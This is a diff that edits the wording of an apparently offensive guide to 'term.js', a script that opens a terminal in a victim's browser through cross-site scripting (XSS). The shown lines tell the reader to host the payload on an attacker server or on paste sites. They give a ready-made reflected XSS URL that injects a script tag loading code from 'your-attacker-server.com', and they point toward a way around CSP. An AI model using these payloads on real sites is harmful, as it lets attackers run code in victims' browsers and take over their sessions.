@@ -6,7 +6,7 @@ term.js | Pop's up a terminal via XSS for direct code input
     *   A simple Python HTTP server `python -m http.server 8000` on your machine, if accessible.
     *   A dedicated web server (Nginx, Apache).
     *   A cloud hosting service or CDN.
-    *   Services like `pastebin` (raw view), `gist` (raw view), or specialized payload hosting services, be cautious about terms of service.
+    *   Services like `pastebin`, `gist` (raw view), or specialized payload hosting services, be cautious about terms of service.
 
     Let's assume you host it at `http://your-attacker-server.com/term.js`.
 
@@ -28,13 +28,13 @@ term.js | Pop's up a terminal via XSS for direct code input
 
 You would inject this small `<script src="..."></script>` tag into the vulnerable parameter in the URL. Since this loader script is tiny, it will not exceed the URL length limits.
 
-**Example (Reflected XSS):**
+**Example:**
 
 If the vulnerable URL is `http://vulnerable-site.com/search?query=UserInput`, you would craft the malicious URL like this:
 
 `http://vulnerable-site.com/search?query=<script src="http://your-attacker-server.com/term.js"></script>`
 
-(Make sure the payload is properly URL-encoded if necessary).
+Make sure the payload is properly URL-encoded if necessary.
 
 **Alternative: Fetch and Execute. If `<script src>` is blocked by CSP**
 
